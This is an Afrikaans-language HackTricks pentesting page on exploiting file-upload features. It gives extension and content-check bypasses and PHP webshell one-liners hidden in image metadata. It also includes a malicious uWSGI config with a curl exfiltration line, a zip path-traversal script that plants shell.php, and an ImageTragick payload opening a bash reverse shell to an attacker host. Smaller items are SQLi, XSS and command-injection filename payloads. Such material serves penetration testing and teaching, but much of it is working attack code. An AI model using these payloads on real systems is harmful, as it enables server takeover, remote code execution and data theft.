# L√™eroplaai

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **HackTricks aflaai in PDF**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty-platform wat deur hackers geskep is, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), en begin verdien belonings tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Algemene metodologie vir l√™eroplaai

Ander nuttige uitbreidings:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Werk in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Om l√™eruitbreidingskontroles te omseil

1. As dit van toepassing is, **kontroleer die vorige uitbreidings.** Toets hulle ook met **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kyk **voeg 'n geldige uitbreiding voor** die uitvoeringsuitbreiding by (gebruik ook vorige uitbreidings):_
* _file.png.php_
* _file.png.Php5_
3. Probeer **spesiale karakters aan die einde voeg.** Jy kan Burp gebruik om al die **ascii** en **Unicode** karakters te **bruteforce**. (_Let daarop dat jy ook die **vorige** genoemde **uitbreidings** kan probeer gebruik_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Probeer om die beskermings te omseil deur die **uitbreidingsontleder** van die bedienerkant te mislei met tegnieke soos **dubbeling** van die **uitbreiding** of **junk**-data (**nul**-byte) tussen uitbreidings te voeg. _Jy kan ook die **vorige uitbreidings** gebruik om 'n beter payload voor te berei._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Voeg **'n ander laag van uitbreidings** by die vorige kontrole:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Probeer om die **uitvoeringsuitbreiding voor die geldige uitbreiding** te plaas en hoop dat die bediener verkeerd gekonfigureer is. (nuttig om Apache-misconfigurations uit te buit waar enigiets met die uitbreiding _**.php**_**, maar** nie noodwendig eindigend in .php\*\* sal kode uitvoer):
* _bv. file.php.png_
7. Gebruik **NTFS alternatiewe datastroom (ADS)** in **Windows**. In hierdie geval sal 'n kolonkarakter ":" ingevoeg word na 'n verbode uitbreiding en voor 'n toegelate een. As gevolg hiervan sal 'n **le√´ l√™er met die verbode uitbreiding** op die bediener geskep word (bv. "file.asax:.jpg"). Hierdie l√™er kan later gewysig word deur ander tegnieke soos die gebruik van sy kort l√™ernaam. Die "**::$data**" patroon kan ook gebruik word om nie-le√´ l√™ers te skep. Daarom kan die byvoeging van 'n puntkarakter na hierdie patroon ook nuttig wees om verdere beperkings te omseil (bv. "file.asp::$data.")
8. Probeer om die l√™ernaamgrense te breek. Die geldige uitbreiding word afgesny en die skadelike PHP word agtergelaat. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 karakters
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 hier en voeg .png by
# Laai die l√™er op en kontroleer die respons hoeveel karakters dit toelaat. Laat ons s√™ 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Maak die payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Bypass Content-Type, Magic Number, Compression & Resizing

* Bypass **Content-Type** kontrole deur die **waarde** van die **Content-Type** **header** in te stel op: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **woordelys**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Bypass **magic number** kontrole deur die **bytes van 'n regte prent** aan die begin van die l√™er toe te voeg (verwar die _file_ bevel). Of stel die skulp in die **metadata** in:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan die payload ook **direk in 'n prent inbring**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* As **kompresie by jou prent gevoeg word**, byvoorbeeld deur van standaard PHP biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php) gebruik te maak, sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompresie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Die webblad kan ook die **prent verklein** deur byvoorbeeld die PHP-GD funksies `imagecopyresized` of `imagecopyresampled` te gebruik. Jy kan egter die **IDAT brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompresie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* 'n Ander tegniek om 'n payload te maak wat **'n prentverkleining oorleef**, is om die PHP-GD funksie `thumbnailImage` te gebruik. Jy kan egter die **tEXt brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompresie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ander truuks om te kontroleer

* Vind 'n kwesbaarheid om die reeds opgelaaide l√™er te **hernoem** (om die uitbreiding te verander).
* Vind 'n **Local File Inclusion** kwesbaarheid om die agterdeur uit te voer.
* **Moontlike inligtingsoffergawe**:
1. Laai die **selfde l√™er** verskeie kere (en terselfdertyd) op met dieselfde naam.
2. Laai 'n l√™er op met die **naam** van 'n **l√™er** of **gids** wat **reeds bestaan**.
3. Laai 'n l√™er op met **‚Äú.‚Äù, ‚Äú..‚Äù, of ‚Äú‚Ä¶‚Äù as sy naam**. Byvoorbeeld, in Apache in **Windows**, as die toepassing die opgelaaide l√™ers in die ‚Äú/www/uploads/‚Äù gids stoor, sal die ‚Äú.‚Äù l√™ernaam 'n l√™er genaamd ‚Äúuploads‚Äù in die ‚Äú/www/‚Äù gids skep.
4. Laai 'n l√™er op wat nie maklik uitgevee kan word nie, soos **‚Äú‚Ä¶:.jpg‚Äù** in **NTFS**. (Windows)
5. Laai 'n l√™er in **Windows** op met **ongeldige karakters** soos `|<>*?‚Äù` in sy naam. (Windows)
6. Laai 'n l√™er in **Windows** op deur **voorbehoude** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9 te gebruik.
* Probeer ook om 'n uitvoerbare l√™er (.exe) of 'n **.html** (minder verdag) op te laai wat kode sal uitvoer wanneer dit per ongeluk deur die slagoffer geopen word.

### Spesiale uitbreidingstruuks

As jy l√™ers na 'n **PHP-bediener** probeer oplaai, [kyk na die **.htaccess** truuk om kode uit te voer](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
As jy l√™ers na 'n **ASP-bediener** probeer oplaai, [kyk na die **.config** truuk om kode uit te voer](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` l√™ers is soos die `.jar` vir Java, maar vir PHP, en kan soos 'n PHP-l√™er gebruik word (deur dit met PHP uit te voer, of dit binne 'n skripsie in te sluit...)

Die `.inc` uitbreiding word soms vir PHP-l√™ers gebruik wat slegs gebruik word om l√™ers in te voer, so iemand kon op 'n punt **hierdie uitbreiding toelaat om uitgevoer te word**.

## **Jetty RCE**

As jy 'n XML-l√™er na 'n Jetty-bediener kan oplaai, kan jy [RCE verkry omdat **nuwe \*.xml en \*.war outomaties verwerk word**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos genoem in die volgende prent, laai die XML-l√™er op na `$JETTY_BASE/webapps/` en wag vir die skulp!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Vir 'n gedetailleerde verkenning van hierdie kwesbaarheid, kyk na die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan uitgebuit word in uWSGI-bedieners as jy die vermo√´ het om die `.ini`-konfigurasie-l√™er te wysig. uWSGI-konfigurasie-l√™ers maak gebruik van 'n spesifieke sintaksis om "sielkundige" veranderlikes, plaatshouers en operatore in te sluit. Die '@' operator, wat gebruik word as `@(l√™ernaam)`, is veral kragtig en maak dit moontlik om die inhoud van 'n l√™er in te sluit. Onder die verskeie ondersteunde skemas in uWSGI is die "exec" skema besonder kragtig en maak dit moontlik om data van 'n proses se standaard uitvoer te lees. Hierdie funksie kan vir bose doeleindes soos Remote Command Execution of Arbitrary File Write/Read gemanipuleer word wanneer 'n `.ini`-konfigurasie-l√™er verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini`-l√™er wat verskillende skemas toon:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die lading vind plaas tydens die ontleding van die konfigurasie l√™er. Om die konfigurasie te aktiveer en te ontleding, moet die uWSGI-proses herlaai word (moontlik na 'n ongeluk of as gevolg van 'n Denial of Service-aanval) of die l√™er moet ingestel word om outomaties te herlaai. Die outomatiese herlaai-funksie, indien geaktiveer, herlaai die l√™er teen gespesifiseerde tussenposes wanneer veranderinge opgespoor word.

Dit is noodsaaklik om die lakse aard van uWSGI se konfigurasie l√™erontleding te verstaan. Spesifiek kan die besproke lading in 'n bin√™re l√™er (soos 'n prent of PDF) ingevoeg word, wat die omvang van potensi√´le uitbuiting verder verbreed.

## **wget-l√™eroplaai/SSRF-truuk**

In sommige gevalle mag jy vind dat 'n bediener **`wget`** gebruik om l√™ers af te laai en jy kan die **URL** aandui. In hierdie gevalle kan die kode nagaan dat die uitbreiding van die afgelaai l√™ers binne 'n witlys is om te verseker dat slegs toegelate l√™ers afgelaai word. Hierdie nagaan kan egter omseil word.\
Die maksimum lengte van 'n l√™ernaam in Linux is 255, maar **wget** verkort die l√™ernaam na 236 karakters. Jy kan 'n l√™er aflaai met die naam "A"\*232+".php"+".gif", hierdie l√™ernaam sal die nagaan omseil (soos in hierdie voorbeeld is ".gif" 'n geldige uitbreiding), maar `wget` sal die l√™er hernoem na "A"\*232+".php".
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Let daarop dat **'n ander opsie** wat jy dalk oorweeg om hierdie kontrole te omseil, is om die **HTTP-bediener na 'n ander l√™er te laat verwys**, sodat die aanvanklike URL die kontrole sal omseil en wget dan die omgeleide l√™er met die nuwe naam sal aflaai. Dit **sal nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die omgeleide bladsy sal aflaai met die naam van die l√™er wat in die oorspronklike URL aangedui is**.


## Gereedskap

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) is 'n kragtige hulpmiddel wat ontwerp is om Pentesters en Bug Hunters te help om l√™eroplaaimeganismes te toets. Dit maak gebruik van verskeie foutbeloningsmetodes om die proses van identifisering en uitbuiting van kwesbaarhede te vereenvoudig, en verseker deeglike assessering van webtoepassings.

## Van l√™eroplaai na ander kwesbaarhede

* Stel **l√™ernaam** in op `../../../tmp/lol.png` en probeer 'n **padtraversie** bereik
* Stel **l√™ernaam** in op `sleep(10)-- -.jpg` en jy mag 'n **SQL-injeksie** kan bereik
* Stel **l√™ernaam** in op `<svg onload=alert(document.domain)>` om 'n XSS te bereik
* Stel **l√™ernaam** in op `; sleep 10;` om 'n paar opdraginjeksies te toets (meer [opdraginjeksietrucs hier](../command-injection.md))
* [**XSS** in beeld (svg) l√™eroplaai](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** l√™er **oplaai** + **XSS** = [**Service Workers** uitbuiting](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg-oplaai**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Oop omleiding** deur svg-l√™er op te laai](../open-redirect.md#open-redirect-uploading-svg-files)
* Probeer **verskillende svg-payloads** van [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Bekende **ImageTrick**-kwesbaarheid](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* As jy die webbediener kan **aandui om 'n beeld van 'n URL af te neem**, kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/) te misbruik. As hierdie **beeld** in 'n **openbare** webwerf gestoor gaan word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en **inligting van elke besoeker steel**.
* [**XXE en CORS**-omseiling met PDF-Adobe-oplaai](pdf-upload-xxe-and-cors-bypass.md)
* Spesiaal ontwerpte PDF's vir XSS: Die [volgende bladsy wys hoe om **PDF-data in te spuit om JS-uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDF's kan oplaai, kan jy 'n PDF voorberei wat arbitr√™re JS sal uitvoer volgens die aangeduide aanwysings.
* Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kyk of die bediener enige **antivirus** het
* Kyk of daar enige **groottebeperking** is vir die oplaai van l√™ers

Hier is 'n top 10-lys van dinge wat jy kan bereik deur op te laai (van [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV-injeksie
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML-injeksie / XSS / Oop omleiding
8. **PNG / JPEG**: Pixel-vloedaanval (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-uitbreiding

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Toverkopbyte

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Raadpleeg [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) vir ander l√™ertipes.

### Zip/Tar-l√™er outomaties gedekomprimeerde oplaai

As jy 'n ZIP kan oplaai wat binne die bediener gedekomprimeer gaan word, kan jy 2 dinge doen:

#### Symlink

Laai 'n skakel op wat sagte skakels na ander l√™ers bevat, en deur toegang tot die gedekomprimeerde l√™ers sal jy toegang tot die gekoppelde l√™ers verkry:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontplooi in verskillende l√™ers

Die onverwagte skepping van l√™ers in gidsies tydens die ontplooiing is 'n belangrike probleem. Ten spyte van aanvanklike aanames dat hierdie opset mag beskerm teen OS-vlak beveluitvoering deur kwaadwillige l√™eroplaaiings, kan die hi√´rargiese kompressie-ondersteuning en gidsverspreidingsvermo√´ns van die ZIP-argief formaat uitgebuit word. Dit stel aanvallers in staat om beperkings te omseil en veilige oploadgidse te ontsnap deur die ontplooiingsfunksionaliteit van die geteikende toepassing te manipuleer.

'n Outomatiese uitbuiting om sulke l√™ers te skep is beskikbaar by [**evilarc op GitHub**](https://github.com/ptoomey3/evilarc). Die nut kan gebruik word soos getoon:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink truuk met evilarc** 'n opsie. As die doelwit is om 'n l√™er soos `/flag.txt` te teiken, moet 'n simbooliese skakel na daardie l√™er in jou stelsel geskep word. Dit verseker dat evilarc nie foute te√´kom tydens sy werking nie.

Hieronder is 'n voorbeeld van Python-kode wat gebruik word om 'n skadelike zip-l√™er te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir l√™er-spraying**

Vir verdere besonderhede **kyk na die oorspronklike pos in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Skep 'n PHP Shell**:
PHP-kode is geskryf om opdragte uit te voer wat deur die `$_REQUEST` veranderlike oorgedra word.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **L√™er-spraying en saamgestelde l√™er-skepping**:
Verskeie l√™ers word geskep en 'n zip-argief word saamgestel wat hierdie l√™ers bevat.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Wysiging met 'n Hex-redigeerder of vi**:
Die name van die l√™ers binne die zip word gewysig met behulp van vi of 'n hex-redigeerder, deur "xxA" te verander na "../" om deur gidslyne te navigeer.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Laai hierdie inhoud op met 'n beelduitbreiding om die kwesbaarheid uit te buit **(ImageMagick, 7.0.1-1)**
(van die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Inbedding PHP Shell op PNG

Die inbedding van 'n PHP shell in die IDAT brokkie van 'n PNG-l√™er kan sekere beeldverwerkingoperasies effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is veral relevant in hierdie konteks, aangesien dit algemeen gebruik word vir die verkleining en hermonstering van beelde. Die vermo√´ van die ingebedde PHP shell om onaangeraak te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gevalle.

'n Gedetailleerde verkenning van hierdie tegniek, insluitend die metodologie en potensi√´le toepassings, word verskaf in die volgende artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en sy implikasies.

Meer inligting by: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglote L√™ers

Poliglote l√™ers dien as 'n unieke instrument in sibersekerheid deur as kameleons op te tree wat geldig in verskeie l√™erformate gelyktydig kan bestaan. 'n Intrigerende voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibried wat as 'n GIF en 'n RAR-argief funksioneer. Sulke l√™ers is nie beperk tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook moontlik.

Die kernnut van poliglote l√™ers l√™ in hul vermo√´ om sekuriteitsmaatre√´ls te omseil wat l√™ers op grond van tipe skerm. Algemene praktyk in verskeie toepassings behels die toelaat van slegs sekere l√™ertipes vir oplaai‚Äîsoos JPEG, GIF, of DOC‚Äîom die risiko wat deur potensieel skadelike formate (bv. JS, PHP, of Phar-l√™ers) veroorsaak word, te verminder. 'n Poliglote kan egter, deur te voldoen aan die strukturele kriteria van verskeie l√™ertipes, hierdie beperkings heimlik omseil.

Ten spyte van hul aanpasbaarheid, ondervind poliglote beperkings. Byvoorbeeld, alhoewel 'n poliglote gelyktydig 'n PHAR-l√™er (PHp ARchive) en 'n JPEG kan wees, mag die sukses van sy oplaai afhang van die platform se beleid ten opsigte van l√™eruitbreidings. As die stelsel streng is oor toelaatbare uitbreidings, mag die bloot strukturele dualiteit van 'n poliglote nie voldoende wees om sy oplaai te waarborg nie.

Meer inligting by: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Verwysings

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), en begin verdien belonings tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
